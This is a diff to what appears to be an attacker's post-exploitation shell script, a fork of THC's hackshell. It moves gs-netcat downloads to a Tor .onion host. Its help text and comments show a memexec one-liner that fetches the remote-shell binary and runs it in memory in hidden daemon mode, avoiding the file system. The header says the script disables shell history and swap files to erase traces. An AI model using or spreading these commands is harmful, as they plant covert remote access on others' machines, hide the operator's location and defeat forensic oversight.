@@ -18,7 +18,7 @@
 #   - De-THC'd (2026-08-16): ip.thc.org recon calls removed from sub()/ptr()
 #     (engagement targets must not leak to third-party infra); ws() runs the
 #     vendored /etc/cobra/whatserver.sh instead of piping from GitHub
-#   - gs-netcat ships from COBRA infra (dl.cobra-os.com), not THC's GitHub
+#   - gs-netcat ships from COBRA infra (the .onion, over Tor), not THC's GitHub
 #
 # Disables history/swap files for bash, wget, less, vim, mysql, curl, ...
 # Adds operator commands, aliases and bash functions.
@@ -155,7 +155,7 @@ Examples:
 
 Or a real world example to deploy gsocket without touching the file system
 or /dev/shm or /tmp (Change the -sSECRET please):
-${CDC}GS_ARGS=\"-ilD -sSecretChangeMe31337\" NAME=python3 memexec https://dl.cobra-os.com/bin/gs-netcat_linux-\$(uname -m)${CN}"
+${CDC}GS_ARGS=\"-ilD -sSecretChangeMe31337\" NAME=python3 memexec http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/bin/gs-netcat_linux-\$(uname -m)${CN}"
 }
 
 xhelp_bounce() {
@@ -1108,9 +1108,10 @@ _bin_single() {
     # bin_dl fd           "https://github.com/orgs/pkgforge/packages/container/package/bincache/fd/official/fd-find"
 
     bin_dl gost         "https://bin.pkgforge.dev/${HS_ARCH}/gost"
-    # COBRA: gs-netcat ships from OUR infra (dl.cobra-os.com), not THC's GitHub.
+    # COBRA: gs-netcat ships from OUR infra (the .onion, over Tor), not THC's GitHub.
     # Object names mirror the upstream release names exactly (see website/README.md).
-    bin_dl gs-netcat    "https://dl.cobra-os.com/bin/gs-netcat_${os,,}-${HS_ARCH}"
+    # Fetch goes through torsocks/proxychains — the host's IP stays hidden.
+    bin_dl gs-netcat    "http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/bin/gs-netcat_${os,,}-${HS_ARCH}"
     # upstream fallback: bin_dl gs-netcat "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${HS_ARCH}"
     # bin_dl grep         "https://bin.pkgforge.dev/${HS_ARCH}/grep"
     bin_dl gzip         "https://bin.pkgforge.dev/${HS_ARCH}/gzip"
@@ -2839,7 +2840,7 @@ _memexec() {
 # memexec /bin/sh -c "echo hi"
 # memexec -c "echo hi" </bin/sh
 # GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec gs-netcat
-# memexec https://dl.cobra-os.com/bin/gs-netcat_linux-x86_64
+# memexec http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/bin/gs-netcat_linux-x86_64
 memexec() {
     local fn
     local prg="$1"
